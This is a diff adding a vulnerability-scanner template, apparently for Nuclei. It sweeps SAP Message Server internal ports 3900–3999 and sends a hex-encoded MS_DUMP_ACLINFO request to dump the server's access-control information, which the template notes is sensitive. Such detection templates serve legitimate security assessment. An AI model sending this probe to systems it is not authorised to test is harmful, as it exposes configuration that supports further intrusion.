@@ -1,0 +1,31 @@
+id: sap-message-server-internal-service-aclinfo-dump
+
+info:
+  name: SAP Message Server internal service detection
+  author: randomstr1ng
+  severity: high
+  tags: network,sap,detect
+  description: This template will dump the ACLINFO on the internal (39xx) tcp service of the SAP Message Server wich allows to register new Application server and dump sensitive information.
+
+
+tcp:
+  - host: 
+    - "{{Hostname}}"
+    port: 3900,3901,3902,3903,3904,3905,3906,3907,3908,3909,3910,3911,3912,3913,3914,3915,3916,3917,3918,3919,3920,3921,3922,3923,3924,3925,3926,3927,3928,3929,3930,3931,3932,3933,3934,3935,3936,3937,3938,3939,3940,3941,3942,3943,3944,3945,3946,3947,3948,3949,3950,3951,3952,3953,3954,3955,3956,3957,3958,3959,3960,3961,3962,3963,3964,3965,3966,3967,3968,3969,3970,3971,3972,3973,3974,3975,3976,3977,3978,3979,3980,3981,3982,3983,3984,3985,3986,3987,3988,3989,3990,3991,3992,3993,3994,3995,3996,3997,3998,3999
+    inputs:
+    # MS_DUMP_ACLINFO - should work only on internal port!
+      - data: 000000a22a2a4d4553534147452a2a0004004d53475f5345525645522020202020202020202020202020202020202020202020202020202020200000000000000000000000000201707973617027732d64756d706572000000000000000000000000000000000000000000000000000000001e000103020000000000001300000000000000000000000000000000000000000000000000000000000000000000000000000000
+        type: hex
+    read-size: 2048
+
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "MSG_SERVER"
+          - "HOST="
+
+
+# Note
+# Internal Port allows to dump parameters of the SAP Message Server
+# External Port returns no data, just a short message
